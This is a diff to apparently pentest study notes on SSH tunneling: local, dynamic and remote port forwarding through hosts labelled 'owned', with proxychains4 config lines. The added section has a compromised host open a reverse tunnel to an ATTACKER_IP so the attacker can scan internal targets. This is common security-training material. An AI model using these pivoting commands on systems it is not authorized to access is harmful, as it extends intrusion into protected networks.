@@ -1,6 +1,6 @@
 # SSH Tunneling
 
-## Local Port Forward
+## Local Port Forwarding
 
 Local SSH tunnel from `$OWNED_IP1` to some `EXTERNAL_IP` (run this from `${OWNED_IP0}`).
 ```
@@ -8,7 +8,7 @@ ssh -N -L 0.0.0.0:${OWNED_PORT0}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${USER}@${OWNED
 ```
 This will allow traffic to go `${ATTACKER_IP} <--> ${OWNED_IP}:${OWNED_PORT} <--> ${EXTERNAL_IP}:${EXTERNAL_PORT}` 
 
-## Dynamic Port Forward
+## Dynamic Port Forwarding
 
 If we want to be able to port-scan or otherwise interact with multiple ports of targets not directly reachable from our network,
 we can use `proxychains4` with OpenSSH's dynamic port forward option.
@@ -25,7 +25,7 @@ the default config is found in `/etc/proxychains4.conf`, but we can also specify
 a config could be to add to a `proxychains4.conf`:
 
 ```
-socks4 	${OWNED_IP0} ${OWNED_PORT0} 
+socks5 	${OWNED_IP0} ${OWNED_PORT0} 
 ```
 
 Now, we can do eg. a call with smbclient like so:
@@ -47,3 +47,24 @@ If the firewall setup doesn't allow us to SSH from `${OWNED_IP}`, which we have 
 ssh -N -R 127.0.0.1:${OWNED_PORT0}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${ATTACKER_USER}@${ATTACKER_IP}
 ```
 Now, we can interact with `${EXTERNAL_IP}:${EXTERNAL_PORT}` via `127.0.0.1:${OWNED_PORT0}`.
+
+
+## Remote Dynamic Port Forwarding
+(pre-req): This requires that we've setup an SSH server on our kali machine with:
+```
+sudo systemctl start ssh
+```
+
+From `${OWNED_IP}`, we can also do remote dynamic port forwarding with:
+
+```
+ssh -N -R ${PROXYCHAINS_PORT} ${ATTACKER_USER}@${ATTACKER_IP}
+```
+For this to work with `proxychains4`, we have to add the following to our config:
+
+```
+socks4 127.0.0.1 ${PROXYCHAINS_PORT}
+```
+
+Now, we can again interact with targets reachable from `${OWNED_IP}` from `${ATTACKER_IP}` by prefixing with `proxychains4` and then setting whatever IP/Port we want to hit. 
+
